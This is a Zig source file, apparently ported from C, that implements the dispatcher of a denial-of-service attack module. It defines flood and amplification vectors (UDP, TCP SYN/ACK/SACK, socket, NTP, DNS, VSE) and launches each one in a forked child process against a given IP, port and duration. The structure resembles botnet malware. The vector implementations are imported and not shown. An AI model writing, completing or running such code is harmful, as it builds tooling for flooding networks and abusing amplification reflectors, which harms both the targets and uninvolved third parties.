//! # Attack Module
//!
//! Fork-based attack dispatcher with multiple vectors.
//!
//! ## C Reference: modules/attack/attack.c, attack.h

const std = @import("std");
const posix = std.posix;

pub const udp = @import("udp.zig");
pub const syn = @import("syn.zig");
pub const socket = @import("socket.zig");
pub const sack = @import("sack.zig");
pub const ntp = @import("ntp.zig");
pub const dns_amp = @import("dns_amp.zig");
pub const vse = @import("vse.zig");

// ============================================================
// ATTACK TYPES (from C: attack.h lines 30-38)
// ============================================================

pub const AttackType = enum(u8) {
    UDP_VSE = 1,
    TCP_SOCKET = 2,
    TCP_SACK = 3,
    UDP_PLAIN = 5,
    TCP_SYN = 6,
    TCP_ACK = 7,
    NTP_AMP = 8,
    DNS_AMP = 9,
};

// ============================================================
// ATTACK DISPATCHER (from C: attack.c attack_start lines 22-67)
// ============================================================

/// Start an attack in a forked child process
pub fn start(attack_type: u8, ip: u32, port: u16, duration: u32) void {
    // Fork to perform attack in background
    const pid = posix.fork() catch return;

    if (pid == 0) {
        // Child process
        switch (attack_type) {
            @intFromEnum(AttackType.UDP_PLAIN) => udp.attackUdpPlain(ip, port, duration),
            @intFromEnum(AttackType.UDP_VSE) => vse.attackVseRaw(ip, port, duration),
            @intFromEnum(AttackType.TCP_SOCKET) => socket.attackSocket(ip, port, duration),
            @intFromEnum(AttackType.TCP_SACK) => sack.attackTcpSack(ip, port, duration),
            @intFromEnum(AttackType.TCP_SYN) => syn.attackTcpSyn(ip, port, duration),
            @intFromEnum(AttackType.TCP_ACK) => syn.attackTcpAck(ip, port, duration),
            @intFromEnum(AttackType.NTP_AMP) => ntp.attackNtp(ip, port, duration),
            @intFromEnum(AttackType.DNS_AMP) => dns_amp.attackDns(ip, port, duration),
            else => {},
        }
        posix.exit(0);
    }

    // Parent continues immediately
}

// ============================================================
// SIGCHLD HANDLER (from C: attack.c sigchld_handler lines 9-12)
// ============================================================

var sigchld_installed = false;

pub fn initSignalHandler() void {
    if (sigchld_installed) return;

    // Note: Full signal handling is Linux-specific
    // On non-Linux, this is a no-op
    const native = @import("builtin").target.os.tag;
    if (native != .linux) {
        sigchld_installed = true;
        return;
    }

    // Linux-specific signal setup would go here
    sigchld_installed = true;
}

fn sigchldHandler(_: c_int) callconv(.c) void {
    // Reap zombie children - simplified for cross-platform
    _ = posix.waitpid(-1, 0) catch {};
}
